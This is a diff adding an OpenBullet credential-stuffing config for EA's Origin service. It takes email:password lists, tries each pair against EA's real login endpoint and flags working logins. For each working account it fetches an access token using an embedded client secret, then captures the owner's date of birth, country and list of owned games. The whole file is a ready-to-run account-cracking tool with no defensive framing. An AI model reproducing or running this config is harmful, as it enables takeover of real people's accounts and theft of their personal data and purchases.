@@ -1,0 +1,109 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-ea0de401f6483bd78a57d3072bfb1a23-LoliKEY",
+  "Name": "Origin",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-19T21:43:50.1012636+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Acemy#7578",
+  "Version": "1.2.2.4",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_LOGIN_URL REQUEST GET "https://signin.ea.com/p/originX/login?execution=e1633018870s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fclient_id%3DORIGIN_PC%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26display%3DoriginX%252Flogin%26locale%3Den_US%26nonce%3D1256%26pc_machine_id%3D15173374696391813834" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#LOGIN REQUEST POST "<HEADERS(SelfLocation)>" 
+  CONTENT "email=<USER>&password=<PASS>&_eventId=submit&cid=6beCmB9ucTISOiFl2iTqx0IDZTklkePP&showAgeUp=true&googleCaptchaResponse=&_rememberMe=on&_loginInvisible=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "latestSuccessLogin" 
+  KEYCHAIN Failure OR 
+    KEY "Your credentials are incorrect or have expired" 
+
+#PARSE_FID PARSE "<SOURCE>" LR "fid=" "\";" -> VAR "FID" 
+
+#GET_CODE REQUEST GET "https://accounts.ea.com/connect/auth?client_id=ORIGIN_PC&response_type=code+id_token&redirect_uri=qrc%3A%2F%2F%2Fhtml%2Flogin_successful.html&display=originX%2Flogin&locale=en_US&nonce=1256&pc_machine_id=15173374696391813834&fid=<FID>" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.8.0 Chrome/53.0.2785.148 Safari/537.36 EA Download Manager Origin/10.5.37.24524" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Host: accounts.ea.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://signin.ea.com/p/originX/login?execution=e1633018870s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fclient_id%3DORIGIN_PC%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26display%3DoriginX%252Flogin%26locale%3Den_US%26nonce%3D1256%26pc_machine_id%3D15173374696391813834" 
+
+#PARSE_CODE PARSE "<HEADERS(Location)>" LR "code=" "&id_" -> VAR "CODE" 
+
+#GET_TOKEN REQUEST POST "https://accounts.ea.com/connect/token" 
+  CONTENT "grant_type=authorization_code&code=<CODE>&client_id=ORIGIN_PC&client_secret=UIY8dwqhi786T78ya8Kna78akjcp0s&redirect_uri=qrc:///html/login_successful.html" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 EA Download Manager Origin/10.5.37.24524" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Origin-UID: 17524622993368447356" 
+  HEADER "X-Origin-Platform: PCWIN" 
+  HEADER "localeInfo: en_US" 
+  HEADER "Accept-Language: en-US" 
+
+#PARSE_TOKEN PARSE "<SOURCE>" LR "access_token\" : \"" "\"," -> VAR "ACCESS" 
+
+#GET_USER_ID REQUEST GET "https://gateway.ea.com/proxy/identity/pids/me" 
+  
+  HEADER "User-Agent: Mozilla/5.0 EA Download Manager Origin/10.5.37.24524" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <ACCESS>" 
+  HEADER "X-Include-Underage: true" 
+  HEADER "X-Extended-Pids: true" 
+
+PARSE "<SOURCE>" LR "dob\" : \"" "\"," -> CAP "DOB" 
+
+PARSE "<SOURCE>" LR "pidId\" : " "," -> VAR "PID" 
+
+PARSE "<SOURCE>" LR "country\" : \"" "\"," -> CAP "COUNTRY" 
+
+REQUEST GET "https://api1.origin.com/ecommerce2/basegames/<PID>?machine_hash=17524622993368447356" 
+  
+  HEADER "User-Agent: Mozilla/5.0 EA Download Manager Origin/10.5.37.24524" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/vnd.origin.v2+json" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "AuthToken: <ACCESS>" 
+  HEADER "X-Origin-UID: 17524622993368447356" 
+  HEADER "X-Origin-Platform: PCWIN" 
+  HEADER "localeInfo: en_US" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Host: api1.origin.com" 
+
+PARSE "<SOURCE>" LR "offerPath\" : \"/" "\"," Recursive=TRUE -> CAP "GAMES" 
+
